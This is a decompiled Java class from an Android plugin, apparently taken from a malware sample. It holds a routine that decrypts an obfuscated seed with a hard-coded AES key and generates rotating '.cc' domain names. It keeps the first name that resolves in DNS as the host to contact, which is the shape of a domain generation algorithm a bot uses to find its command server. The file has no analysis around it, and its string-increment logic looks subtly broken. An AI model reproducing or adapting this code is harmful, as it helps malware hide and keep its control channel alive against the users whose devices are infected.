package com.hs.p.basic;

import android.content.Context;
import com.hs.p.common.utils.LOG;

/* JADX INFO: loaded from: /Users/ruben/projector-dump/downloads/plugin.jar */
public class HostUtils {
    private static final String BASE = "H4sIAAAAAAAAAMvx26t3yPZ9ac5yABf/PbQKAAAA";
    private static String TAG = "HostUtils";
    private static boolean isRunning = false;

    public static String getSlaveAvailableHost(Context context) {
        String str = null;
        if (isRunning) {
            return null;
        }
        isRunning = true;
        try {
            String strDecrypt = EncryptUtils.decrypt(BASE, Constants.HOST_AESKEY);
            if (strDecrypt != null && !strDecrypt.isEmpty()) {
                int lastCheckIndex = Settings.getLastCheckIndex(context);
                LOG.d(TAG, "The startIndex is := " + lastCheckIndex);
                for (int i = 0; i < 100; i++) {
                    int i2 = (lastCheckIndex + i) % 100;
                    Settings.putLastCheckIndex(context, i2 + 1);
                    String str2 = incrementString(strDecrypt, i2 * i2 * (strDecrypt.charAt(0) + 1)) + ".cc";
                    if (isHostKnown(str2)) {
                        LOG.d(TAG, "The random connected domain is := " + str2);
                        Settings.putLastKnowHost(context, "https://" + str2 + "/");
                        str = str2;
                        break;
                    }
                    LOG.d(TAG, "The random unconnected domain is := " + str2);
                }
                return str;
            }
            return null;
        } catch (Exception unused) {
            return str;
        } finally {
            isRunning = false;
        }
    }

    private static String incrementString(String str, int i) {
        char[] charArray = str.toCharArray();
        for (int i2 = 0; i2 < i; i2++) {
            boolean z = true;
            for (int length = charArray.length - 1; length >= 0 && z; length--) {
                char c = charArray[length];
                if (c == '9') {
                    charArray[length] = 'a';
                } else {
                    if (c == 'z') {
                        charArray[length] = '0';
                        z = true;
                    } else {
                        charArray[length] = (char) (c + 1);
                    }
                }
                z = false;
            }
            if (z) {
                charArray = ('1' + String.valueOf(charArray)).toCharArray();
            }
        }
        return new String(charArray);
    }

    private static boolean isHostKnown(String str) {
        return HTTPDNS.isHostResolvable(str);
    }
}
